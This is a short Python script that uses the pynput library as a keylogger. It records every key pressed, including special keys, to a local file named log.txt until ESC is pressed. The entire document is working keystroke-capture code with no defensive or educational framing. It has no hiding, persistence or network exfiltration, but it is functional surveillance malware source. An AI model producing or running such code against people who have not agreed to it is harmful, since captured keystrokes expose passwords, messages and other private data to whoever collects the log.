from pynput import keyboard

def on_press(key):
    try:
        with open("log.txt", "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        with open("log.txt", "a") as log_file:
            log_file.write(f"[{key}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop listener when ESC is pressed

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()



